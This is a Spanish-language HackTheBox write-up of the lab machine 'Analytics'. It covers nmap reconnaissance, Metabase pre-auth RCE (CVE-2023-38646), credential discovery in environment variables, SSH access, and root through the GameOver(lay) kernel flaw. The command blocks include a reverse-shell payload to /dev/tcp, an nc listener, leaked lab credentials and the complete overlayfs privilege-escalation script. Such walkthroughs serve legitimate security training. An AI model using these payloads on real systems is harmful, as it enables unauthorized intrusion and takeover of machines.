# Analytics

![](../../../../~gitbook/image.md)Publicado: 02 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Analytics es una máquina Linux de dificultad Easy en HackTheBox que presenta un escenario realista de pentesting web. La máquina expone un servicio Metabase vulnerable que permite la ejecución remota de comandos sin autenticación previa (CVE-2023-38646). Tras obtener acceso inicial al contenedor, se realiza un movimiento lateral utilizando credenciales encontradas en variables de entorno para acceder al sistema host. Finalmente, se explota una vulnerabilidad de escalada local conocida como GameOver(lay) (CVE-2023-2640 & CVE-2023-32629) en el kernel de Ubuntu para obtener privilegios de root.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🌐 Enumeración Web

#### 80 HTTP
http://analytical.htb![](../../../../~gitbook/image.md)Al hacer clic en opción Login somos redirigidos a un nuevo vhost en el que vemos que se está usando un servicio llamado Metabase.http://data.analytical.htb![](../../../../~gitbook/image.md)Descubrimiento de MetabaseDado que el fuzzing de directorios y de vhost no nos aporta nada relevante en ninguno de los subdominios, buscamos información sobre el servicio Metabase y rápidamente descubrimos que ha sido objeto de una vulnerabilidad CVE-2023-38646 que permite la ejecución remota de comandos con Pre-Auth.
#### 💥 Explotación - CVE-2023-38646
Encontramos algunos exploits públicos que merece la pena probar
https://github.com/m3m0o/metabase-pre-auth-rce-pocEn primer lugar accedemos al siguiente endpoint y buscamos la cadena que corresponde a la versión y al setup-token:Primero comprobamos la versión para saber si nos sirve el exploit:![](../../../../~gitbook/image.md)A continuación obtenemos el token:http://data.analytical.htb/api/session/properties![](../../../../~gitbook/image.md)
#### 🎪 Acceso inicial
Este token es todo lo que necesitamos para ejecutar el exploit de la siguiente forma:Y ganamos acceso a la máquina como usuario metabase:![](../../../../~gitbook/image.md)
#### 🔑 Escalada de privilegios
En el directorio raíz vemos un archivo .dockerenv, lo cual nos permite a priori intuir que podemos estar dentro de un contenedor:![](../../../../~gitbook/image.md)Enumeramos variables de entorno
#### 🚀 Movimiento lateral

#### 🔓 Escape del contenedor via SSH
Buscamos la forma de escapar del contenedor. Dado que ahora tenemos las credenciales`metalytics:An4lytics_ds20223#` vamos a usarlas para tratar de iniciar sesión en el servicio ssh y obtener la primera flag en el directorio del usuario metalytics
#### 👑 Escalada de privilegios a root
Verificamos que el metalytics no puede ejecutar algún comando como root:Tampoco obtenemos nada interesante tras enumerar binarios con permisos SUID ni capabilties.🎮 GameOver(lay) - CVE-2023-2640 & CVE-2023-32629Sin embargo enumeramos la versión del kernel y vemos que podría ser vunerable a GameOverlay Vulnerability CVE-2023–2640 & CVE-2023–32629La vulnerabilidad conocida como GameOver(lay) afecta a versiones específicas del kernel de Linux en Ubuntu, incluyendo la versión 6.2.0. Esta vulnerabilidad permite a un usuario local sin privilegios escalar sus permisos hasta obtener acceso como root.[wiz.io+5Medium+5The MasterMinds Notes | Motasem Hamdan+5](https://medium.com/thesecmaster/how-to-fix-gameover-lay-two-local-privilege-escalation-vulnerabilities-in-ubuntu-linux-kernel-93124dbe51e7?utm_source=chatgpt.com)[vk9-sec.com](https://vk9-sec.com/cve-2023-32629-cve-2023-2640privilege-escalation-gameoverlay-ubuntu-privilege-escalation/?utm_source=chatgpt.com)
#### 🧩 ¿En qué consiste la vulnerabilidad?
GameOver(lay) abarca dos vulnerabilidades distintas en el módulo OverlayFS del kernel de Ubuntu:- CVE-2023-2640: Permite que un usuario sin privilegios establezca atributos extendidos privilegiados en archivos montados, lo que puede llevar a la ejecución de código con privilegios elevados.
- CVE-2023-32629: Se produce cuando se omiten las comprobaciones de permisos al copiar metadatos de inodos, lo que también puede resultar en una escalada de privilegios.
Ambas vulnerabilidades surgen debido a modificaciones específicas realizadas por Ubuntu en el módulo OverlayFS, que introdujeron flujos de código inseguros al omitir comprobaciones de permisos en ciertas operacionesUsaremos el siguiente exploit para llevar a cabo la escalada:https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.shLast updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯  ping -c2 10.10.11.233
PING 10.10.11.233 (10.10.11.233) 56(84) bytes of data.
64 bytes from 10.10.11.233: icmp_seq=1 ttl=63 time=46.2 ms
64 bytes from 10.10.11.233: icmp_seq=2 ttl=63 time=49.8 ms

--- 10.10.11.233 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 46.196/47.995/49.795/1.799 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.233 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.11.233 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 08:08 CEST
Nmap scan report for 10.10.11.233
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
echo "10.10.11.233 analytical.htb data.analytical.htb" | sudo tee -a /etc/hosts
```

```
python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"
```

```
rlwrap nc -lnvp 443
```

```
wget https://raw.githubusercontent.com/m3m0o/metabase-pre-auth-rce-poc/refs/heads/main/main.py

python3 main.py -u http://data.analytical.htb/ -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'bash -i &> /dev/tcp/10.10.14.3/443 0>&1'
```

```
b0a87564595e:/app$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=b0a87564595e
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/app
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
TERM=xterm
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
OLDPWD=/
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

```
ssh metalytics@10.10.11.233
The authenticity of host '10.10.11.233 (10.10.11.233)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.
metalytics@10.10.11.233's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

System information as of Mon Jun  2 07:15:16 AM UTC 2025

System load:              0.298828125
Usage of /:               95.6% of 7.78GB
Memory usage:             29%
Swap usage:               0%
Processes:                156
Users logged in:          0
IPv4 address for docker0: 172.17.0.1
IPv4 address for eth0:    10.10.11.233
IPv6 address for eth0:    dead:beef::250:56ff:fe94:cb77

=> / is using 95.6% of 7.78GB

* Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
just raised the bar for easy, resilient and secure K8s cluster deployment.

https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics@analytics:~$
```

```
metalytics@analytics:~$ sudo -l
[sudo] password for metalytics:
Sorry, user metalytics may not run sudo on localhost.
metalytics@analytics:~$
```

```
metalytics@analytics:/opt$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

```
# !/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

```
metalytics@analytics:/tmp$ nano exploit.sh
metalytics@analytics:/tmp$ chmod +x exploit.sh
metalytics@analytics:/tmp$ ./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/tmp# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
root@analytics:/tmp#
```
